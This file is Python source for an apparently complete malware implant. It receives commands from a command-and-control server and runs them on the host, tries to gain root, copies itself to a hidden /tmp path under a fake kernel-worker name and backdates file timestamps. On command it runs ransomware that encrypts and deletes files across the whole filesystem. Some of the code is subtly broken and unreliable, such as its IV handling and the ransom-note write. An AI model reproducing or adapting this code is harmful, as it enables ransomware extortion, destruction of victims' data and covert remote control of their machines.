#!/usr/bin/env python3

import subprocess
import hashlib
import os
import sys
import uuid
import threading
import queue
from Cryptodome.Cipher import AES

import requests

import shutil
import shlex
import time
import random
import pathlib
import base64

# For use where no verified domain is available for C2
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
	import pwd
except ModuleNotFoundError:
	pwd = None

# TODO signed packets, not passwords
password = "password"
HOST, PORT = "0.0.0.0", 9998
debug = True

c2_id = 0


def make_get(url):
	"""
	Make Get request to C2 server
	Args:
		url: url of resource

	Returns: the data decoded from base64

	"""
	try:
		r = requests.get(f"https://{HOST}:{PORT}/{url}", verify=False)
	except ConnectionRefusedError:
		return 400
	return base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')


def make_post(url, data):
	"""
	Make Post request to C2 server
	Args:
		url: resource
		data: data, not encoded

	Returns: status code and response text

	"""
	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
	r = requests.post(f"https://{HOST}:{PORT}/{url}", data=data, verify=False)
	return r.status_code


def handle(data):
	"""
	Handle incoming commands from C2
	Args:
		data: string with command format key::data::parameters::integrity, now list

	Returns: sends data to C2 server

	"""
	key = data[0]
	command = data[1]
	parameters = data[2]
	integrity = data[3]

	if verify(key, command, parameters, integrity):
		stdout = run_builtin(command, parameters)
		if stdout == "BUILTIN":
			stdout = run_command(command, parameters)
	else:
		stdout = f"Invalid command: {data}"

	output = f"{command}::{parameters}::{stdout}"
	send_data(output)


def register():
	"""
	Register with C2 server
	Send uname with random salt

	Returns: make post request to C2 server
	"""
	uname = get_uname()
	generate_id()
	global c2_id
	code = make_post("register", f"{uname}::{c2_id}")
	if code == 200:
		return True
	return False


def request_commands():
	"""
	Make HTTP request

	Returns: the polling status and commands to execute
	"""
	global c2_id
	data = make_get(f"{c2_id}/commands").split()
	return data[0], data[1:]


def send_data(data):
	"""
	Make POST request to C2 server with command data
	Args:
		data:

	Returns:

	"""
	global c2_id
	status = make_post(f"{c2_id}/data", data)
	return status


def get_uname():
	"""
	Generate uname string

	Returns: the string containing uname string
	"""
	return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"


def generate_id():
	"""
	Generate a numerical id based on the uname and a random salt
	Returns:

	"""
	global c2_id
	c2_id = uuid.uuid4().int


def run_builtin(command, parameters):
	"""
	Run builtin command, not local terminal
	Args:
		parameters:
		command:

	Returns:

	"""
	if command == "nme":
		return get_uname()
	elif command == "cwd":
		return os.getcwd()
	elif command == "env":
		return os.environ
	elif command == "pid":
		return str(os.getpid())
	elif command == "usr":
		return os.getlogin()
	elif command == "lock":

		# Removes self if successful
		if execute_ransom(parameters):
			presence("KILL")
		else:
			return "LOCK FAILED"
	else:
		return "BUILTIN"


def run_command(command, parameters):
	"""
	Execute command on local terminal
	Args:
		command:
		parameters:

	Returns:

	"""
	try:
		# TODO add shelex processing
		process = subprocess.run([command, parameters], capture_output=True, check=True, encoding='utf-8')
	except subprocess.CalledProcessError:
		return "Error on Command"

	return process.stdout


def verify(key, command, parameters, integrity):
	"""
	Check hash of command, verifying that no data transmission errors have occurred, then check against password
	Args:
		key:
		command:
		parameters:
		integrity:

	Returns:

	"""
	# TODO use salt and hash
	if key != password:
		print("Wrong password!")
		return False

	data = f"{key}::{command}::{parameters}"
	if hashlib.sha256(data.encode("utf-8")).hexdigest() != integrity:
		print("Data error detected!")
		return False
	return True


def get_pname(pid):
	"""
	get name of function from pid
	Args:
		pid: pid of process

	Returns: name of process

	"""
	return os.system(f"ps -o cmd= {pid}")


def upgrade_shell():
	"""
	try to upgrade to root shell
	Returns:
	"""
	try:
		uid = pwd.getpwnam('root')[2]
		os.setuid(uid)
	except (PermissionError, AttributeError):
		pass


def select_files(start):
	"""Walk through directory, add all files to queue

	Arguments:
		start -- Start point for walk 

	Returns:
		queue containing all file names
	"""
	q = queue.Queue()
	extensions = (
		'.txt', '.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
		'.sie',
		'.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic', '.bkf',
		'.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup', '.syncdb',
		'.gho',
		'.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis', '.sid', '.ncf',
		'.menu',
		'.layout', '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf', '.iwd', '.vpk', '.tor',
		'.psk',
		'.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff', '.vpp_pc', '.lrf', '.m2', '.mcmeta',
		'.vfs0', '.mpqge', '.kdb', '.db0', '.mp3', '.upx', '.rofl', '.hkx', '.bar', '.upk', '.das', '.iwi', '.litemod',
		'.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav', '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak',
		'.big', '.unity3d', '.wotreplay', '.xxx', '.desc', '.py', '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg',
		'.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer', '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2',
		'.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref', '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay',
		'.sr2',
		'.srf', '.arw', '.3fr', '.dng', '.jpeg', '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd',
		'.dbfv',
		'.mdf', '.wb2', '.rtf', '.wpd', '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt',
		'.xlk',
		'.xlsb', '.xlsm', '.xlsx', '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods',
		'.odt',
		'.sql', '.zip', '.tar', '.tar.gz', '.tgz', '.biz', '.ocx', '.html', '.htm', '.3gp', '.srt', '.cpp', '.mid',
		'.mkv',
		'.mov', '.asf', '.mpeg', '.vob', '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg',
		'.aes',
		'.ARC', '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', '.cgm', '.tif', '.tiff', '.NEF', '.cmd',
		'.class', '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd',
		'.MYI',
		'.MYD', '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11 (Security copy)', '.sldm',
		'.sldx',
		'.ppsm', '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif',
		'.stc',
		'.sxc', '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw',
		'.ott',
		'.csr', '.key', 'wallet.dat')
	for root, _, files in os.walk(start):
		for file in files:
			if file.lower().endswith(extensions):
				q.put(os.path.join(root, file))
	return q


class Worker(threading.Thread):
	def __init__(self, q, key):
		threading.Thread.__init__(self)
		self.queue = q
		self.key = key

	def run(self):
		while True:
			q_item = self.queue.get()
			try:
				self.encrypt(q_item, self.key)
				with open(q_item, 'wb'):
					pass
				try:
					os.remove(q_item)
				except Exception:
					pass
			except Exception:
				pass
			self.queue.task_done()

	@staticmethod
	def encrypt(filename, key):
		"""Encrypt a file with AES

		Arguments:
			filename -- file to encrypt
			key -- password
		"""
		chunk_size = 65536
		output_file = filename + '.locked'
		filesize = str(os.path.getsize(filename)).zfill(16)
		iv = ''
		for i in range(16):
			iv += chr(random.randint(0, 255))
		encryptor = AES.new(key, AES.MODE_CBC, iv)
		with open(filename, 'rb') as (infile):
			with open(output_file, 'wb') as (outfile):
				outfile.write(filesize)
				outfile.write(iv)
				while True:
					chunk = infile.read(chunk_size)
					if len(chunk) == 0:
						break
					else:
						if len(chunk) % 16 != 0:
							chunk += ' ' * (16 - len(chunk) % 16)
					outfile.write(encryptor.encrypt(chunk))


def execute_ransom(key):
	"""Execute threaded ransomware process

	Arguments:
		key -- secret key from server 

	Returns:
		Message for remote server
	"""
	try:
		q = select_files("/", )

		for _ in range(4):
			w = Worker(q, key)
			w.daemon = True
			w.start()

		q.join()

		with open(f"{os.path.expanduser('~')}/ransom.txt") as f:
			# TODO: ransom note technique here
			f.write("NOTE")

		return True
	except Exception as e:
		print(f"Failed with error {e}")
		return False


def become_silent():
	"""
	Go stealth, move to secret location, set presence IOC
	Returns: Kills process if not covert or already on system

	"""

	cmdline = sys.argv[0]

	# TODO randomize names, dependant on parent, windows location
	hidden, bandit = "/tmp/.mem_systemd", "[kworker/2:0-events]"
	if not presence("CHECK") and cmdline != hidden:
		presence("LEAVE")
		print("No presence detected, going in...")
		# Copy self to hidden location
		shutil.copyfile(cmdline, hidden)
		# make that file executable
		subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {sys.executable} {hidden} &\""))
		# change the file timestamp to obfuscate compromise time
		randomize_timestamp(hidden)
		print("Killing overt agent...")
		exit(0)
	if cmdline == hidden:
		print("Agent is covert!")
	else:
		print("Already present, killing...")
		presence("LEAVE")
		# Should die if already on system
		exit(0)


def randomize_timestamp(file):
	"""
	Generate random timestamp for files created between a year and 6 months ago
	Args:
		file: filename 

	Returns: sets file timestamp

	"""
	set_stamp = time.time() - random.randrange(15778463, 31556926)
	os.utime(file, (set_stamp, set_stamp))


def presence(mode):
	"""Set presence mode
	KILL - remove all system presence, delete self
	LEAVE - leave a mark on the system to indicate presence
	CHECK - search for evidence of system presence

	Arguments:
		mode -- Which mode to set

	Returns:
		True if successfully set or if presence already on system
	"""
	# TODO add more names, randomize
	touch = f"{str(pathlib.Path.home())}/.zshconf"
	env = "BASH"

	if mode == "KILL":
		os.remove(touch)
		del os.environ[env]
		os.remove(sys.argv[0])
		exit(0)
	elif mode == "LEAVE":
		f = open(touch, "w")
		f.close()
		randomize_timestamp(touch)
		os.environ[env] = "1"
		return True
	elif mode == "CHECK" and debug is False:
		if os.path.isfile(touch):
			return True
		if env in os.environ and os.environ[env] == "1":
			return True
		return False
	else:
		return False


def delay_for_mode(mode):
	"""
	Generate delay appropriate to mode
	Live - 2 Seconds, intended for interactive mode
	Active - 30 seconds
	Passive - between 6 and 18 hours
	Args:
		mode:

	Returns:

	"""
	if mode == "active":
		delay = 30
	elif mode == "live":
		delay = 2
	else:
		# Passive
		delay = random.randrange(21600, 64800)
	print(f"Delaying for {delay}s...")
	time.sleep(delay)
	exit(0)


if __name__ == "__main__":
	upgrade_shell()
	become_silent()

	if not register():
		print("Failed to register with C2 server")

	last_commands = ""

	# Core Loop 
	while 1:
		active, cmds = request_commands()

		cmd_hash = hashlib.md5(''.join(cmds).encode('utf-8')).hexdigest()

		if last_commands != cmd_hash:
			for cmd in cmds:
				handle(cmd.split("::"))
			last_commands = cmd_hash
		else:
			print("No change from C2")

		delay_for_mode(active)
